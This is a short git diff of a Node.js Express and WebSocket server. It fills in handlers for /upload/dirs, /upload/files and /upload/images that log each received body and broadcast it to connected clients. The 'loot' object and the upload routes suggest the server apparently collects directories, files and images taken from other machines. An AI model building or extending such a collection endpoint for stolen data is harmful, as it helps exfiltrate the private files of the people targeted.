@@ -10,6 +10,8 @@ const wss = new WebSocketServer({ server });
 app.use(express.text());
 app.use(express.json());
 app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
+
 
 const loot = {
   directories: {},
@@ -24,17 +26,21 @@ function broadcast(type, data) {
 }
 
 app.post('/upload/dirs', (req, res) => {
-  console.log(req);
+  console.log(req.body);
+  broadcast('dirs', req.body);
   res.sendStatus(200);
+
 });
 
 app.post('/upload/files', (req, res) => {
-  // TODO
+  console.log(req.body);
+  broadcast('files', req.body)
   res.sendStatus(200);
 });
 
 app.post('/upload/images', (req, res) => {
-  // TODO
+  console.log('Image received, length:', req.body.length);
+  broadcast('images', req.body);
   res.sendStatus(200);
 });
 
